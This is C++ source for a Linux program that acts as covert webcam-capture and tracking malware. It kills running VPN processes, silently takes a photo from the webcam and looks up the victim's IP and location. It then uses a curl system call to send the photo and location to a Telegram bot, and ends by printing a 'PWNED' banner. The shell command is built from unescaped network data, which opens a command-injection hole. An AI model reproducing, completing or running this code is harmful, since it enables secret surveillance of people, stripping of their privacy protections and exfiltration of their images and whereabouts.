#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/videodev2.h>
#include <cstring>
#include <string>
#include <cstdlib>
#include <curl/curl.h>
#include <nlohmann/json.hpp>
#include <iostream>
#define STB_IMAGE_WRITE_IMPLEMENTATION
#include "stb_image_write.h"
using namespace std;
using json = nlohmann::json;
const char* device_name = "/dev/video0";
int xioctl(int fd, int request, void* arg) {
    int r;
    do r = ioctl(fd, request, arg);
    while (r == -1 && ((errno == EINTR) || (errno == EAGAIN)));
    return r;
}
size_t write_callback(void* contents, size_t size, size_t nmemb, string* userp) {
    userp->append((char*)contents, size * nmemb);
    return size * nmemb;
}
string get_ip_and_location() {
    CURL* curl = curl_easy_init();
    string response;
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "http://ip-api.com/json");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    try {
        json j = json::parse(response);
        string ip = j["query"].get<string>();
        string city = j.value("city", "Unknown");
        string country = j.value("country", "Unknown");
        return "IP: " + ip + ", Location: " + city + ", " + country;
    } catch (...) {
        return "IP/Location: Unknown";
    }
}
int capture_image(const char* filename) {
    int fd = open(device_name, O_RDWR);
    if (fd == -1) return 1;
    struct v4l2_capability cap;
    if (xioctl(fd, VIDIOC_QUERYCAP, &cap) == -1) {
        close(fd);
        return 1;
    }
    struct v4l2_format fmt = {};
    fmt.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    fmt.fmt.pix.width = 640;
    fmt.fmt.pix.height = 480;
    fmt.fmt.pix.pixelformat = V4L2_PIX_FMT_YUYV;
    fmt.fmt.pix.field = V4L2_FIELD_INTERLACED;
    if (xioctl(fd, VIDIOC_S_FMT, &fmt) == -1) {
        close(fd);
        return 1;
    }
    struct v4l2_requestbuffers req = {};
    req.count = 4; // Increased buffers
    req.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    req.memory = V4L2_MEMORY_MMAP;
    if (xioctl(fd, VIDIOC_REQBUFS, &req) == -1) {
        close(fd);
        return 1;
    }
    struct v4l2_buffer buf = {};
    buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    buf.memory = V4L2_MEMORY_MMAP;
    buf.index = 0;
    if (xioctl(fd, VIDIOC_QUERYBUF, &buf) == -1) {
        close(fd);
        return 1;
    }
    void* buffer = mmap(NULL, buf.length, PROT_READ | PROT_WRITE, MAP_SHARED, fd, buf.m.offset);
    if (buffer == MAP_FAILED) {
        close(fd);
        return 1;
    }
    if (xioctl(fd, VIDIOC_QBUF, &buf) == -1) {
        munmap(buffer, buf.length);
        close(fd);
        return 1;
    }
    enum v4l2_buf_type type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    if (xioctl(fd, VIDIOC_STREAMON, &type) == -1) {
        munmap(buffer, buf.length);
        close(fd);
        return 1;
    }
    if (xioctl(fd, VIDIOC_DQBUF, &buf) == -1) {
        munmap(buffer, buf.length);
        close(fd);
        return 1;
    }
    int width = fmt.fmt.pix.width;
    int height = fmt.fmt.pix.height;
    int size = width * height * 3;
    unsigned char* rgb = new unsigned char[size];
    #pragma omp parallel for
    for (int i = 0; i < width * height * 2; i += 4) {
        unsigned char y1 = ((unsigned char*)buffer)[i];
        unsigned char u = ((unsigned char*)buffer)[i+1];
        unsigned char y2 = ((unsigned char*)buffer)[i+2];
        unsigned char v = ((unsigned char*)buffer)[i+3];
        float r1 = y1 + 1.402 * (v - 128);
        float g1 = y1 - 0.344 * (u - 128) - 0.714 * (v - 128);
        float b1 = y1 + 1.772 * (u - 128);
        float r2 = y2 + 1.402 * (v - 128);
        float g2 = y2 - 0.344 * (u - 128) - 0.714 * (v - 128);
        float b2 = y2 + 1.772 * (u - 128);
        int idx = i / 2 * 3;
        rgb[idx] = (unsigned char)max(0.0f, min(255.0f, r1));
        rgb[idx+1] = (unsigned char)max(0.0f, min(255.0f, g1));
        rgb[idx+2] = (unsigned char)max(0.0f, min(255.0f, b1));
        idx += 3;
        rgb[idx] = (unsigned char)max(0.0f, min(255.0f, r2));
        rgb[idx+1] = (unsigned char)max(0.0f, min(255.0f, g2));
        rgb[idx+2] = (unsigned char)max(0.0f, min(255.0f, b2));
    }
    if (!stbi_write_jpg(filename, width, height, 3, rgb, 100)) {
        delete[] rgb;
        munmap(buffer, buf.length);
        close(fd);
        return 1;
    }
    delete[] rgb;
    munmap(buffer, buf.length);
    close(fd);
    return 0;
}
int main() {
    system("pkill -f 'openvpn|wireguard|protonvpn|nordvpn|expressvpn' > /dev/null 2>&1");
    const char* filename = "/tmp/capture.jpg";
    if (capture_image(filename) != 0) return 1;
    const char* token = "";
    const char* chat_id = "";
    string ip_location = get_ip_and_location();
    string cmd = "curl -s -F chat_id=" + string(chat_id) + " -F photo=@" + filename + " -F caption=\"" + ip_location + "\" https://api.telegram.org/bot" + string(token) + "/sendPhoto > /dev/null 2>&1";
    system(cmd.c_str());
    pid_t pid = fork();
    if (pid == 0) {
        execlp("xdg-open", "xdg-open", filename, (char*)NULL);
        exit(1);
    }
    system("clear");
    cout << R"(
    ____ _       ___   ____________ 
   / __ \ |     / / | / / ____/ __ \
  / /_/ / | /| / /  |/ / __/ / / / /
 / ____/| |/ |/ / /|  / /___/ /_/ / 
/_/     |__/|__/_/ |_/_____/_____/  
    )" << endl;
    return 0;
}